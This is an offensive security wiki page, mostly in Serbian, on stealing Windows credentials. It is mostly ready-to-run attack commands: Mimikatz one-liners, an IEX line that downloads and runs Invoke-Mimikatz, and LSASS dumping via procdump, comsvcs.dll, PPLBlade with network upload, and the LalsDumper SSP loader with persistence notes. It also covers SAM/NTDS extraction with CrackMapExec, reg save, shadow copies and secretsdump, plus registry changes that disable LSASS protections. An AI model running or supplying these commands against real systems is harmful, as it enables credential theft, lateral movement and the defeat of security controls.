# Krađa Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Pronađi druge stvari koje Mimikatz može da uradi na** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **Ove zaštite mogu sprečiti Mimikatz da izvuče neke credentials.**

## Credentials with Meterpreter

Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji** sam napravio da biste **pretražili passwords and hashes** unutar žrtve.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Zaobilaženje AV

### Procdump + Mimikatz

Pošto **Procdump iz** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**je legitiman Microsoft alat**, nije detektovan od strane Defender-a.\
Možete koristiti ovaj alat da **dump the lsass process**, **download the dump** i **extract** **credentials locally** iz dump-a.

Možete takođe koristiti [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ovaj proces se izvodi automatski pomoću [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Napomena**: Neki **AV** mogu **detektovati** kao **zlonamerno** korišćenje **procdump.exe to dump lsass.exe**, ovo je zato što detektuju stringove **"procdump.exe" and "lsass.exe"**. Dakle, **diskretnije** je **proslediti** kao **argument** **PID** lsass.exe procdump-u **umesto** imena lsass.exe.

### Dumping lsass with **comsvcs.dll**

A DLL named **comsvcs.dll** found in `C:\Windows\System32` is responsible for **dumping process memory** in the event of a crash. This DLL includes a **function** named **`MiniDumpW`**, designed to be invoked using `rundll32.exe`.\
It is irrelevant to use the first two arguments, but the third one is divided into three components. The process ID to be dumped constitutes the first component, the dump file location represents the second, and the third component is strictly the word **full**. No alternative options exist.\
Upon parsing these three components, the DLL is engaged in creating the dump file and transferring the specified process's memory into this file.\
Utilization of the **comsvcs.dll** is feasible for dumping the lsass process, thereby eliminating the need to upload and execute procdump. This method is described in detail at [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Možete automatizovati ovaj proces pomoću** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass with Task Manager**

1. Kliknite desnim tasterom miša na Task Bar i izaberite Task Manager
2. Kliknite na More details
3. Potražite proces "Local Security Authority Process" u kartici Processes
4. Desni klik na proces "Local Security Authority Process" i kliknite na "Create dump file".

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je Microsoft potpisani binarni fajl koji je deo [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketa.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpovanje lsass-a pomoću PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) je Protected Process Dumper Tool koji podržava obfuskaciju memory dump-a i transfer na remote workstations bez zapisivanja na disk.

**Ključne funkcionalnosti**:

1. Zaobilaženje PPL protection
2. Obfuskacija memory dump fajlova radi izbegavanja Defender signature-based detection mechanisms
3. Upload memory dump koristeći RAW i SMB upload metode bez zapisivanja na disk (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon isporučuje trostepeni dumper nazvan **LalsDumper** koji nikada ne poziva `MiniDumpWriteDump`, tako da EDR hooks na tom API-ju nikad ne aktiviraju:

1. **Stage 1 loader (`lals.exe`)** – pretražuje `fdp.dll` za placeholder koji se sastoji od 32 mala slova `d`, prepisuje ga apsolutnom putanjom do `rtu.txt`, snima ispravljeni DLL kao `nfdp.dll`, i poziva `AddSecurityPackageA("nfdp","fdp")`. Ovo prisiljava **LSASS** da učita maliciozni DLL kao novi Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – kada LSASS učita `nfdp.dll`, DLL čita `rtu.txt`, XOR-uje svaki bajt sa `0x20` i mapira dekodovani blob u memoriju pre predaje izvršavanja.
3. **Stage 3 dumper** – mapirani payload ponovo implementira MiniDump logiku koristeći **direct syscalls** rešene iz heširanih API imena (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Namenski export nazvan `Tom` otvara `%TEMP%\<pid>.ddt`, strimuje kompresovani LSASS dump u fajl i zatvara handle tako da exfiltration može da se obavi kasnije.

Napomene operatera:

* Držite `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` u istom direktorijumu. Stage 1 prepisuje hardkodirani placeholder apsolutnom putanjom do `rtu.txt`, tako da njihovo razdvajanje prekida lanac.
* Registracija se vrši dodavanjem `nfdp` u `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Možete unapred postaviti tu vrednost da biste naterali LSASS da ponovo učita SSP pri svakom bootu.
* `%TEMP%\*.ddt` fajlovi su kompresovani dumpovi. Dekompresujte lokalno, pa ih prosledite Mimikatz/Volatility za ekstrakciju kredencijala.
* Pokretanje `lals.exe` zahteva admin/SeTcb prava da bi `AddSecurityPackageA` uspeo; kada poziv vrati, LSASS transparentno učitava zlonamerni SSP i izvršava Stage 2.
* Uklanjanje DLL-a sa diska ga ne izbacuje iz LSASS-a. Ili obrišite registry unos i restartujte LSASS (reboot) ili ga ostavite za dugoročnu persistenciju.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Izvucite NTDS.dit sa ciljnog DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Izdvojite istoriju lozinki iz NTDS.dit sa ciljanog DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Prikaži atribut pwdLastSet za svaki nalog u NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Ove datoteke treba da budu smeštene u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM_. Ali **ne možete ih jednostavno kopirati na uobičajen način** jer su zaštićene.

### Iz registra

Najlakši način da ukradete te datoteke je da dobijete kopiju iz registra:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Preuzmite** te fajlove na vaš Kali računar i **izvucite hashes** koristeći:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Možete kopirati zaštićene fajlove koristeći ovu uslugu. Potrebno je da imate administratorska prava.

#### Using vssadmin

Binarni fajl vssadmin dostupan je samo u Windows Server verzijama
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ali isto možete uraditi iz **Powershell**. Ovo je primer **kako kopirati SAM file** (koristi se hard disk "C:" i fajl se čuva u C:\users\Public), ali ovo možete koristiti za kopiranje bilo kog zaštićenog fajla:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kod iz knjige: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Konačno, možete takođe koristiti [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da napravite kopiju SAM, SYSTEM i ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Fajl **NTDS.dit** je poznat kao srce **Active Directory**, i sadrži ključne podatke o objektima korisnika, grupama i njihovim članstvima. Tu se čuvaju **password hashes** za domain korisnike. Ovaj fajl je Extensible Storage Engine (ESE) baza podataka i nalazi se na **_%SystemRoom%/NTDS/ntds.dit_**.

U ovoj bazi se vode tri primarne tabele:

- **Data Table**: Ova tabela čuva detalje o objektima kao što su korisnici i grupe.
- **Link Table**: Prati odnose, na primer članstva u grupama.
- **SD Table**: Ovde se nalaze **Security descriptors** za svaki objekat, obezbeđujući sigurnost i kontrolu pristupa za pohranjene objekte.

Više informacija o ovome: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows koristi _Ntdsa.dll_ da komunicira sa tim fajlom i on je korišćen od strane _lsass.exe_. Zbog toga, deo fajla **NTDS.dit** može biti lociran **u memoriji `lsass`** (možete pronaći najnovije pristupane podatke, verovatno zbog poboljšanja performansi korišćenjem **cache**).

#### Dekriptovanje heševa unutar NTDS.dit

Heš je šifrovan tri puta:

1. Dekriptirajte Password Encryption Key (**PEK**) pomoću **BOOTKEY** i **RC4**.
2. Dekriptirajte heš pomoću **PEK** i **RC4**.
3. Dekriptirajte heš pomoću **DES**.

**PEK** ima **istu vrednost** na **svakom domain controller-u**, ali je **šifrovan** unutar **NTDS.dit** fajla koristeći **BOOTKEY** iz **SYSTEM** fajla domain controller-a (različit između domain controller-a). Zbog toga, da biste dobili credentials iz NTDS.dit fajla, **trebaće vam fajlovi NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kopiranje NTDS.dit koristeći Ntdsutil

Dostupno od Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Takođe možete koristiti [**volume shadow copy**](#stealing-sam-and-system) trik da kopirate **ntds.dit** fajl. Imajte na umu da će vam takođe trebati kopija **SYSTEM** fajla (opet, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trik).

### **Izdvajanje hashes iz NTDS.dit**

Kada ste **pribavili** fajlove **NTDS.dit** i **SYSTEM**, možete koristiti alate kao što je _secretsdump.py_ da **izvučete hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Takođe ih možete **automatski izvući** koristeći važećeg domain admin korisnika:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Za **velike NTDS.dit fajlove** preporučuje se izvlačenje korišćenjem [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Konačno, možete takođe koristiti **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ili **mimikatz** `lsadump::lsa /inject`

### **Ekstrakcija objekata domena iz NTDS.dit u SQLite bazu podataka**

NTDS objekti mogu da budu ekstrahovani u SQLite bazu podataka pomoću [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Izvlače se ne samo tajni podaci, već i kompletni objekti i njihovi atributi za dalju ekstrakciju informacija kada je sirovi NTDS.dit fajl već pribavljen.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive je opciona, ali omogućava dešifrovanje tajni (NT & LM hashes, supplemental credentials kao što su cleartext passwords, kerberos ili trust keys, NT & LM password histories). Pored drugih informacija, izvučeni su sledeći podaci: korisnički i mašinski nalozi sa njihovim hash-evima, UAC flags, timestamp poslednjeg logona i promene lozinke, opis naloga, imena, UPN, SPN, grupe i rekurzivna članstva, stablo organizational units i članstva, trusted domains sa tipom trust-ova, smerom i atributima...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). you can use this binary to extract credentials from several software.
```
lazagne.exe all
```
## Ostali alati za izvlačenje kredencijala iz SAM i LSASS

### Windows credentials Editor (WCE)

Ovaj alat može da se koristi za izvlačenje kredencijala iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Izvlači kredencijale iz SAM datoteke
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Ekstrahovanje credentials iz SAM file
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Preuzmite ga sa: [http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i samo ga **pokrenite** i lozinke će biti izvučene.

## Istraživanje neaktivnih RDP sesija i slabljenje bezbednosnih kontrola

Ink Dragon’s FinalDraft RAT uključuje `DumpRDPHistory` tasker čije su tehnike korisne za svakog red-teamera:

### DumpRDPHistory-style prikupljanje telemetrije

* **Outbound RDP targets** – parsirajte svaki user hive na `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Svaki subkey sadrži ime servera, `UsernameHint`, i timestamp poslednjeg zapisa. Možete reprodukovati FinalDraft-ovu logiku pomoću PowerShell-a:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – pretražite log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` za Event ID-e **21** (uspešna prijava) i **25** (prekid sesije) da mapirate ko je administrirao mašinu:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Kada saznate koji Domain Admin redovno pristupa, izvršite dump LSASS-a (pomoću LalsDumper/Mimikatz) dok im **prekinuta** sesija još postoji. CredSSP + NTLM fallback ostavlja njihov verifier i tokene u LSASS-u, koje potom možete replay-ovati preko SMB/WinRM da dohvatite `NTDS.dit` ili postavite persistenciju na kontrolerima domena.

### Registry downgrades targeted by FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Podešavanje `DisableRestrictedAdmin=1` prisiljava potpuno credential/ticket reuse tokom RDP-a, omogućavajući pass-the-hash style pivots.
* `LocalAccountTokenFilterPolicy=1` onemogućava UAC token filtering, pa local admins dobijaju unrestricted tokens preko mreže.
* `DSRMAdminLogonBehavior=2` omogućava DSRM administratoru da se prijavi dok je DC online, dajući napadačima još jedan ugrađen nalog sa visokim privilegijama.
* `RunAsPPL=0` uklanja LSASS PPL zaštite, čineći pristup memoriji trivijalnim za dumpers kao što je LalsDumper.

## References

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
